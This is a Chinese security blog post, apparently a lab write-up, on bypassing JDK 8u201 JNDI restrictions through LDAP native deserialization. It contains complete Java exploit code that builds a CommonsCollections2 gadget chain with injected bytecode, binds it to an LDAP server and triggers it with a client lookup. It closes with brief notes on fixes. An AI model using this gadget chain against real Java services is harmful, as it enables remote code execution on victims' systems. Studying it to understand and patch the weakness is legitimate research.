参考博客：

[JNDI注入与动态类加载](https://halfblue.github.io/2021/11/18/JNDI%E6%B3%A8%E5%85%A5%E4%B8%8E%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/)

# 分析版本

jdk8u201

# 流程分析

在前面[JNDI-ldap绕过](https://yezzz.blog.csdn.net/article/details/140796385)分析中提到，存在ldap原生反序列化利用点。

再回顾一下，在deserializeObject

```java
private static Object deserializeObject(byte[] var0, ClassLoader var1) throws NamingException { //var1=AppClassLoader，修复之后在本地加载
    try {
        ByteArrayInputStream var2 = new ByteArrayInputStream(var0);

        try {
            Object var20 = var1 == null ? new ObjectInputStream(var2) : new Obj.LoaderInputStream(var2, var1); 
            Throwable var21 = null;

            Object var5;
            try {
                var5 = ((ObjectInputStream)var20).readObject();  //原生反序列化
            } catch (Throwable var16) {
//....
```

原生反序列化可以直接打，不需要Reference。

# 攻击实现

我们模拟一下受害方是存在CC利用链的，所以现在项目中添加依赖

```xml
<dependencies>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-collections4</artifactId>
        <version>4.0</version>
    </dependency>
</dependencies>
```

打下CC2

重写一个Ldap的绑定

```java
public class JNDILDAPServerBypass {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        //Reference refObj = new Reference("Test", "Test", "http://localhost:4444/");
        initialContext.rebind("ldap://localhost:10389/cn=Evil,dc=example,dc=com", getEvilPriorityQueue());

    }

    public static PriorityQueue getEvilPriorityQueue() throws Exception {
        //CC2
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());


        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", null, null);

        //chainedTransformer.transform(1);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1)); //改为ConstantTransformer,把利用链断掉
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(1);

        ///Class transformingComparatorClass = TransformingComparator.class;  //也可以
        Class transformingComparatorClass = transformingComparator.getClass();
        Field transformer = transformingComparatorClass.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator, invokerTransformer);

        return priorityQueue;
    }

}
```

看下Ldap服务器

![image-20240730181129112](https://s2.loli.net/2024/07/31/3Qq5PohtwBUIrDN.png)

之后模拟受害方客户端请求

```java
public class JNDILDAPClient {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("ldap://localhost:10389/cn=Evil,dc=example,dc=com");
        //LdapCtx

    }
}
```

攻击成功

![image-20240730181311044](https://s2.loli.net/2024/07/31/tXLmZP6NCbwKA85.png)

**分析上面代码时，也分析到了`decodeReference(var0, var2);`调用了，deserializeObject方法也会产生反序列化漏洞**

# 修复

1. 关于deserializeObject的修复，提供了个类之前trustURLCodebase属性开关，但是默认开启，不影响
2. 关于decodeReference，也引入了一个属性